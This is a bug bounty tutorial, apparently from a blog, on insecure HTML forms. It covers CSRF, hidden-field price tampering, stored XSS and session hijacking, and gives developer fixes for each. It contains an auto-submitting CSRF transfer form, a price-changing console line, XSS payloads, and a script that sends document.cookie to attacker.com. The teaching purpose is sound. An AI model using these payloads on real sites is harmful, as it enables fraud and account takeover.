### **Bug Bounty Scenario: Exploiting Insecure HTML Forms**  

In this scenario, weâ€™ll explore how **attackers can exploit insecure forms** and how you, as a **bug bounty hunter**, can identify and report these vulnerabilities.  

---

## **1. Scenario: CSRF (Cross-Site Request Forgery) in a Banking App**  
### **ðŸ›  Target Web App:**  
A **banking website** allows users to **transfer funds** using the following form:  

```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="account" value="123456789">  <!-- Attacker can change this -->
    <label for="amount">Transfer Amount:</label>
    <input type="text" id="amount" name="amount" required>
    <input type="submit" value="Transfer Money">
</form>
```

### **ðŸ›  Vulnerability: CSRF (Cross-Site Request Forgery)**  
- **Issue:** No CSRF protection (no CSRF token).  
- **Impact:** An attacker can trick a user into submitting a malicious request without their consent.  

### **ðŸŽ¯ How an Attacker Can Exploit It**  
1. The attacker creates a **malicious page** with the following **hidden form**:
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="account" value="999999999">  <!-- Attacker's account -->
    <input type="hidden" name="amount" value="5000">  <!-- Steal $5000 -->
    <input type="submit">
</form>
<script>
    document.forms[0].submit();  // Auto-submit form when user visits page
</script>
```
2. The attacker **hosts this page** and tricks the victim into visiting it (via email, social media, etc.).  
3. The form **automatically submits** without the victimâ€™s knowledge.  
4. The victim unknowingly **transfers money to the attacker's account**.  

### **âœ… How to Fix This (For Developers)**
- Implement **CSRF tokens** in forms:
```php
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
```
- **Validate the CSRF token** on the server-side before processing requests.

---

## **2. Scenario: Hidden Field Manipulation**
### **ðŸ›  Target Web App:**  
An **e-commerce website** uses a **hidden field** to store product prices in a purchase form:  

```html
<form action="https://shop.com/checkout" method="POST">
    <input type="hidden" name="price" value="100">
    <input type="hidden" name="product_id" value="123">
    <input type="submit" value="Buy Now">
</form>
```

### **ðŸ›  Vulnerability: Price Manipulation**  
- **Issue:** The price is stored in a **hidden field** and is **not validated** on the server.  
- **Impact:** An attacker can **change the price** before submitting the form.

### **ðŸŽ¯ How an Attacker Can Exploit It**
1. Open **Developer Tools (F12) â†’ Console** and enter:
```javascript
document.querySelector('input[name="price"]').value = "1";  // Change price to $1
```
2. Click **"Buy Now"** and purchase the item for $1 instead of $100!  

### **âœ… How to Fix This (For Developers)**
- **Never trust client-side data** (hidden fields, cookies, URL parameters).
- Validate prices on the server by **fetching the actual price from the database**.

---

## **3. Scenario: XSS (Cross-Site Scripting) in a Comment Form**
### **ðŸ›  Target Web App:**  
A blog has a **comment system** where users can submit comments:  

```html
<form action="submit_comment.php" method="POST">
    <textarea name="comment"></textarea>
    <input type="submit" value="Post Comment">
</form>
```

### **ðŸ›  Vulnerability: Stored XSS**
- **Issue:** The comment is stored in the database **without sanitization**.
- **Impact:** Attackers can inject **malicious scripts** that execute on every visitor's browser.

### **ðŸŽ¯ How an Attacker Can Exploit It**
1. Enter this **malicious comment** in the form:
```html
<script>alert('Hacked!');</script>
```
2. The script gets **stored in the database**.
3. Every time a visitor loads the page, they see a **JavaScript alert** (or worse, the attacker steals their cookies).

### **âœ… How to Fix This (For Developers)**
- **Escape user input** using:
```php
$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
```
- **Use Content Security Policy (CSP)** to block inline JavaScript.

---

## **4. Scenario: Session Hijacking via Insecure Cookies**
### **ðŸ›  Target Web App:**  
A website stores session data in **cookies** without security flags:

```php
setcookie("session_id", "123456", time() + 3600);
```

### **ðŸ›  Vulnerability: Session Hijacking**
- **Issue:** The cookie **lacks `HttpOnly` and `Secure` flags**, making it accessible via JavaScript.
- **Impact:** Attackers can **steal session cookies** and impersonate users.

### **ðŸŽ¯ How an Attacker Can Exploit It**
1. Inject **malicious JavaScript** into a vulnerable page:
```html
<script>
    document.location = "https://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```
2. The attacker's server logs the victimâ€™s **session ID**.
3. The attacker **reuses the session ID** to take over the account.

### **âœ… How to Fix This (For Developers)**
- Set secure cookies:
```php
setcookie("session_id", "123456", time() + 3600, "/", "", true, true);
```
**(Secure = true, HttpOnly = true)**

---

## **Final Thoughts: Bug Bounty Tips**
### **ðŸ”Ž How to Find These Vulnerabilities in a Bug Bounty Hunt**
1. **Intercept Forms with Burp Suite** to check for:
   - CSRF protection (`_csrf_token` missing?).
   - Hidden field manipulation (`price`, `role`, etc.).
2. **Modify Form Data** using browser DevTools (`F12 â†’ Console`).
3. **Check Cookie Security** (`HttpOnly` and `Secure` flags).
4. **Try XSS Payloads** in text inputs and search fields.
5. **Review API Requests** for insecure parameters.
